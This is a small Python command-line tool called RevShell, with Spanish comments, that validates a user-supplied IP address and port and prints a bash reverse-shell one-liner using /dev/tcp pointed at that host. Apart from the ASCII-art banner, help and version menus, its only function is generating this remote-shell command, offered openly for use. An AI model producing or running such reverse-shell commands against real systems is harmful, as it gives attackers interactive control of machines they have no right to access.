#!/usr/bin/python3
# -*- coding: utf-8 -*-

#[*] Name of the tool: RevShell
#[*] Description: Print the code of a reverse shell.
#[*] Version: 1.1
#[*] Author: JRIC2002
#[*] Date of creation: 10/05/2020
#[*] Date of last update: 21/08/2020

#Modules

#External modules
import ipaddress
import sys

class Color:
    """ Colores en código ANSI. """

    #Foreground
    black = "\033[0;30m"
    gray = "\033[1;30m"
    red = "\033[1;31m"
    green = "\033[1;32m"
    yellow = "\033[1;33m"
    blue = "\033[1;34m"
    magenta = "\033[1;35m"
    cyan = "\033[1;36m"
    white = "\033[1;37m"

    #Background
    b_black = "\033[0;40m"
    b_gray = "\033[1;40m"
    b_red = "\033[1;41m"
    b_green = "\033[1;42m"
    b_yellow = "\033[1;43m"
    b_blue = "\033[1;44m"
    b_magenta = "\033[1;45m"
    b_cyan = "\033[1;46m"
    b_white = "\033[1;47m"

#Instancia de la clase Color
color = Color()

class Start:
    """ Inicio de la herramienta RevShell. """

    def __init__(self):
        """ Variables de instancia. """
        pass

    def logo(self):
        """ Imprime el logo de la herramienta RevShell. """

        print("")
        print("   {}__________              {}_________.__           .__  .__ ".format(color.blue, color.green))
        print("   {}\______   \ _______  __{}/   _____/|  |__   ____ |  | |  | ".format(color.blue, color.green))
        print("    {}|       _// __ \  \/ /{}\_____  \ |  |  \_/ __ \|  | |  | ".format(color.blue, color.green))
        print("    {}|    |   \  ___/\   / {}/        \|   Y  \  ___/|  |_|  |__ ".format(color.blue, color.green))
        print("    {}|____|_  /\___  >\_/ {}/_______  /|___|  /\___  >____/____/ ".format(color.blue, color.green))
        print("            {}\/     \/             {}\/      \/     \/ ".format(color.blue, color.green))
        print("     {}[{}~{}]           {}Tool created by: {}JRIC2002            {}[{}~{}]".format(color.white, color.green, color.white, color.yellow, color.white, color.white, color.green, color.white))
        print("     {}[{}~{}] {}Description: {}Print the code of a reverse shell {}[{}~{}]".format(color.white, color.green, color.white, color.yellow, color.white, color.white, color.green, color.white))
        print("     \___________________----^_^----____________________/")
        print("")

    def help_menu(self):
        """ Imprime el menú de ayuda de la herramienta RevShell. """

        print("{}Usage: python3 RevShell.py [options]".format(color.white))
        print("       python3 RevShell.py <IP> <PORT>")
        print("")
        print("Options:")
        print("   -h, --help              Show this help message and exit.")
        print("   -v, --version           Show program's version number and exit.")

    def version(self):
        """ Imprime la versión de la herramienta RevShell. """

        print("{}#RevShell version 1.1".format(color.white))

    def error(self):
        """ Imprime un mensaje de error. """

        print("{}Usage: python3 RevShell.py [options]".format(color.white))
        print("       python3 RevShell.py <IP> <PORT>")
        print("")
        print("RevShell.py: Error: Invalid option.")
        print("Use -h or --help to see the help menu.")

#Instancia de la clase Start
start = Start()

class Functions:
    """ Funcionalidades de ma herramienta RevShell. """

    def __init__(self):
        """ Variables de instancia. """
        pass

    def verify(self, ip, port):
        """ Verifica la dirección IP y el Puerto."""
        
        try:
            ipaddress.ip_address(ip)
            try:
                if int(port) >= 1 and int(port) <= 65535:
                    pass
                else:
                    raise Exception
            except Exception:
                print("{}Error: Invalid port.{}".format(color.red, color.white))
                sys.exit(1)
        except Exception:
            print("{}Error: Invalid IP.{}".format(color.red, color.white))
            sys.exit(1)

    def rev_shell(self, ip, port):
        """ Imprime reverse shells. """
        
        a = "bash -i >& /dev/tcp/{}/{} 0>&1".format(ip, port)
        b = "More reverse shells"

        for code in (a, b):
            print("{}[{}*{}] ".format(color.white, color.green, color.white) + code)
#Instancia de la clase Functions
functions = Functions()

#Start
if len(sys.argv) == 1:
    start.logo()
    start.help_menu()
elif len(sys.argv) == 2:
    if sys.argv[1] == "-h" or sys.argv[1] == "--help":
        start.logo()
        start.help_menu()
    elif sys.argv[1] == "-v" or sys.argv[1] == "--version":
        start.logo()
        start.version()
    else:
        start.logo()
        start.error()
elif len(sys.argv) == 3:
    start.logo()
    functions.verify(sys.argv[1], sys.argv[2])
    functions.rev_shell(sys.argv[1], sys.argv[2])
else:
    start.logo()
    start.error()
